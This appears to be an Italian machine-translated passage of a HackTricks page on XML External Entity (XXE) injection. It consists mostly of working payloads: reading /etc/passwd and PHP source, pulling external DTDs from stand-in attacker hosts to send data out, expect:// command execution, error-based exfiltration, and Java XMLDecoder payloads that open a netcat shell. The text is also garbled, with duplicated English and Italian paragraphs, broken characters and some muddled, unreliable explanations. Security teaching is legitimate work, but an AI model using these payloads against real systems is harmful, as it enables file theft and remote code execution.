Nota che le **entit√† HTML** utilizzate devono essere **numeriche** (come nell'esempio seguente: \[in questo esempio]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
Esempio DTD:

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

Questo √® un esempio di un attacco di XXE (XML External Entity) che sfrutta una vulnerabilit√† nel parsing di un documento XML. In questo caso, viene definito un documento DTD (Document Type Definition) che specifica l'elemento "foo" come qualsiasi cosa e l'entit√† "xxe" che fa riferimento al file "/etc/passwd" del sistema. Successivamente, l'entit√† "xxe" viene richiamata all'interno dell'elemento "foo". Quando il parser XML elabora questo documento, cerca di risolvere l'entit√† "xxe" e quindi legge il contenuto del file "/etc/passwd", che potrebbe contenere informazioni sensibili come nomi utente e password. Questo attacco pu√≤ essere utilizzato per ottenere informazioni riservate o eseguire altre azioni dannose sul sistema di destinazione.
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## Wrapper PHP

### Base64

**Estrai** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Estrazione di risorse esterne**

An XML External Entity (XXE) attack is a type of vulnerability that allows an attacker to extract data from the server or perform other malicious actions by exploiting the way XML parsers process external entities. 

Un attacco di Entit√† Esterna XML (XXE) √® un tipo di vulnerabilit√† che consente a un attaccante di estrarre dati dal server o di eseguire altre azioni malevole sfruttando il modo in cui i parser XML elaborano le entit√† esterne.

In an XXE attack, the attacker crafts a malicious XML input that includes a reference to an external entity. When the XML is parsed, the parser attempts to resolve the external entity, which can lead to the disclosure of sensitive information or the execution of arbitrary code.

In un attacco XXE, l'attaccante crea un input XML malevolo che include un riferimento a un'entit√† esterna. Quando l'XML viene analizzato, il parser tenta di risolvere l'entit√† esterna, il che pu√≤ portare alla divulgazione di informazioni sensibili o all'esecuzione di codice arbitrario.

There are different techniques to exploit XXE vulnerabilities, such as:

Esistono diverse tecniche per sfruttare le vulnerabilit√† XXE, come:

- **Parameter Entity Expansion (PXE)**: This technique involves expanding parameter entities to read files from the server's filesystem or perform other actions.

- **Espansione di Entit√† Parametro (PXE)**: Questa tecnica prevede l'espansione delle entit√† parametriche per leggere file dal filesystem del server o eseguire altre azioni.

- **External Document Type Definition (DTD) Retrieval**: By referencing an external DTD, an attacker can retrieve sensitive files or perform actions based on the DTD's content.

- **Recupero di Definizioni di Tipo di Documento Esterno (DTD)**: Referenziando una DTD esterna, un attaccante pu√≤ recuperare file sensibili o eseguire azioni basate sul contenuto della DTD.

- **Blind XXE**: In this technique, the attacker does not receive the response directly, but can infer information based on the application's behavior.

- **XXE Cieco**: In questa tecnica, l'attaccante non riceve la risposta direttamente, ma pu√≤ dedurre informazioni in base al comportamento dell'applicazione.

To prevent XXE attacks, it is important to:

Per prevenire gli attacchi XXE, √® importante:

- Disable external entity processing in XML parsers or configure them to only allow trusted entities.

- Disabilitare l'elaborazione delle entit√† esterne nei parser XML o configurarli in modo da consentire solo entit√† affidabili.

- Use whitelisting to restrict the types of entities that can be parsed.

- Utilizzare una lista bianca per limitare i tipi di entit√† che possono essere analizzate.

- Validate and sanitize user input to prevent malicious XML from being processed.

- Validare e sanificare l'input dell'utente per evitare che XML malevoli vengano elaborati.

- Keep XML parsers and libraries up to date to benefit from security patches and improvements.

- Mantenere aggiornati i parser XML e le librerie per beneficiare di patch di sicurezza e miglioramenti.
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Esecuzione remota del codice

**Se il modulo "expect" di PHP √® caricato**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**

Il **SOAP** (Simple Object Access Protocol) √® un protocollo di comunicazione basato su XML utilizzato per lo scambio di informazioni strutturate tra sistemi distribuiti su una rete. Tuttavia, il SOAP pu√≤ essere vulnerabile agli attacchi di **XEE** (XML External Entity).

### **Cos'√® XEE?**

L'**XEE** (XML External Entity) √® una vulnerabilit√† che sfrutta la capacit√† di un'applicazione di elaborare entit√† esterne definite in un documento XML. Questa vulnerabilit√† pu√≤ consentire a un attaccante di leggere file arbitrari sul server o eseguire attacchi di denial of service (DoS).

### **Come funziona l'attacco XEE?**

L'attacco XEE sfrutta la funzionalit√† di elaborazione delle entit√† esterne di un'applicazione SOAP. Un attaccante pu√≤ inserire un'entit√† esterna nel documento XML inviato all'applicazione, che verr√† poi elaborata dal parser XML. L'entit√† esterna pu√≤ fare riferimento a un file sul server e l'attaccante pu√≤ ottenere il contenuto di quel file nella risposta dell'applicazione.

### **Esempio di attacco XEE**

Di seguito √® riportato un esempio di payload XEE che pu√≤ essere utilizzato per leggere il file `/etc/passwd` sul server:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

In questo esempio, l'entit√† esterna `xxe` viene definita come il contenuto del file `/etc/passwd`. Quando l'applicazione elabora il documento XML, il contenuto del file `/etc/passwd` verr√† incluso nella risposta.

### **Come proteggersi dagli attacchi XEE?**

Per proteggersi dagli attacchi XEE, √® consigliabile adottare le seguenti misure:

- Utilizzare parser XML sicuri che disabilitino l'elaborazione delle entit√† esterne.
- Validare e filtrare attentamente i dati di input XML per evitare l'inclusione di entit√† esterne non autorizzate.
- Limitare l'accesso ai file di sistema sensibili e utilizzare meccanismi di autorizzazione adeguati.
- Mantenere il software sempre aggiornato con le ultime patch di sicurezza.

### **Conclusione**

L'attacco XEE pu√≤ sfruttare la vulnerabilit√† del protocollo SOAP per ottenere accesso non autorizzato a file sensibili sul server. √à importante adottare misure di sicurezza adeguate per proteggersi da questo tipo di attacco, come l'utilizzo di parser XML sicuri e la validazione accurata dei dati di input XML.
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Questo esempio √® ispirato a [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

XLIFF (XML Localization Interchange File Format) viene utilizzato per standardizzare lo scambio di dati nei processi di localizzazione. √à un formato basato su XML utilizzato principalmente per trasferire dati localizzabili tra strumenti durante la localizzazione e come formato di scambio comune per gli strumenti CAT (Computer-Aided Translation).

### Analisi della richiesta cieca

Viene effettuata una richiesta al server con il seguente contenuto:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Tuttavia, questa richiesta provoca un errore interno del server, menzionando specificamente un problema con le dichiarazioni di markup:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Nonostante l'errore, viene registrato un hit su Burp Collaborator, indicando un certo livello di interazione con l'entit√† esterna.

Esfiltrazione dei dati fuori banda
Per esfiltrare i dati, viene inviata una richiesta modificata:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Questa approccio rivela che l'User Agent indica l'uso di Java 1.8. Una limitazione nota di questa versione di Java √® l'incapacit√† di recuperare file contenenti un carattere di nuova riga, come ad esempio /etc/passwd, utilizzando la tecnica Out of Band.

Esfiltrazione dei dati basata sugli errori
Per superare questa limitazione, viene utilizzato un approccio basato sugli errori. Il file DTD √® strutturato come segue per innescare un errore che include dati da un file di destinazione:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Il server risponde con un errore, riflettendo l'assenza del file, indicando che il server sta cercando di accedere al file specificato:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Per includere il contenuto del file nel messaggio di errore, il file DTD viene modificato:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Questa modifica porta all'esfiltrazione riuscita del contenuto del file, come risulta dall'output di errore inviato tramite HTTP. Ci√≤ indica un attacco XXE (XML External Entity) riuscito, sfruttando sia tecniche Out of Band che Error-Based per estrarre informazioni sensibili.


## RSS - XEE

XML valido con formato RSS per sfruttare una vulnerabilit√† XXE.

### Ping back

Semplice richiesta HTTP al server degli attaccanti
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Leggi file

L'attacco di lettura del file consente a un attaccante di accedere al contenuto di file arbitrari sul server di destinazione. Questo attacco sfrutta la vulnerabilit√† delle entit√† esterne XML (XXE) o delle entit√† esterne estese (XEE) per ottenere informazioni sensibili.

#### XXE

Le entit√† esterne XML (XXE) consentono di includere dati esterni in un documento XML. Un attaccante pu√≤ sfruttare questa vulnerabilit√† per leggere file sul server di destinazione. L'attacco XXE pu√≤ essere eseguito utilizzando diversi vettori, come l'inclusione di un file locale o l'accesso a risorse di rete.

#### XEE

Le entit√† esterne estese (XEE) sono una variante delle XXE che consentono di eseguire codice arbitrario sul server di destinazione. Questo tipo di attacco pu√≤ essere molto pericoloso, in quanto consente all'attaccante di ottenere il controllo completo del server.

Per proteggere un'applicazione da questi attacchi, √® consigliabile:

- Disabilitare le entit√† esterne XML (XXE) o le entit√† esterne estese (XEE) se non sono necessarie.
- Validare e filtrare i dati di input per prevenire l'inclusione di entit√† esterne non autorizzate.
- Utilizzare parser XML sicuri che non supportano le entit√† esterne o che le gestiscono correttamente.

In conclusione, l'attacco di lettura del file sfrutta le vulnerabilit√† delle entit√† esterne XML (XXE) o delle entit√† esterne estese (XEE) per accedere a file sensibili sul server di destinazione. Per proteggere un'applicazione da questi attacchi, √® necessario adottare misure preventive come la disabilitazione delle entit√† esterne e la validazione dei dati di input.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Leggere il codice sorgente

Utilizzando il filtro base64 di PHP
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoder √® una classe Java che crea oggetti basati su un messaggio XML. Se un utente malintenzionato riesce a far s√¨ che un'applicazione utilizzi dati arbitrari in una chiamata al metodo **readObject**, otterr√† immediatamente l'esecuzione del codice sul server.

### Utilizzando Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

ProcessBuilder √® una classe in Java che viene utilizzata per creare e gestire processi esterni al programma corrente. Questa classe fornisce metodi per specificare il comando da eseguire, gli argomenti da passare al comando e l'ambiente in cui eseguire il comando.

Per utilizzare ProcessBuilder, √® necessario creare un'istanza della classe e impostare il comando e gli argomenti desiderati utilizzando il metodo `command()`. Successivamente, √® possibile impostare l'ambiente di esecuzione utilizzando il metodo `environment()`. Infine, √® possibile avviare il processo utilizzando il metodo `start()`.

Ecco un esempio di utilizzo di ProcessBuilder per eseguire un comando esterno:

```java
ProcessBuilder processBuilder = new ProcessBuilder();
processBuilder.command("ls", "-l", "/tmp");
Process process = processBuilder.start();
```

In questo esempio, viene creato un oggetto ProcessBuilder e viene impostato il comando "ls" con gli argomenti "-l" e "/tmp". Successivamente, viene avviato il processo utilizzando il metodo `start()`.

ProcessBuilder √® utile in molte situazioni, ad esempio quando √® necessario eseguire comandi esterni da un'applicazione Java o quando si desidera automatizzare l'esecuzione di script o programmi esterni.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Strumenti

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Riferimenti

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
* Estrarre informazioni tramite HTTP utilizzando il proprio DTD esterno: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
